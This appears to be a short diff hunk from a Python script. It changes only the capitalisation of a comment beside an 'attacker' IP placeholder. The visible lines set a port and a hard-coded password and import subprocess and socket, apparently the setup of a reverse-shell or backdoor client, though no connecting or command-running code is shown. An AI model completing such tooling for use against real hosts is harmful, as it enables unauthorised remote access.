@@ -1,7 +1,7 @@
 import subprocess
 import socket
 
-attacker = #your IP
+attacker = #your ip
 port = 443
 passwrd = "ReallyReallyLongPasswordForProtection"
 
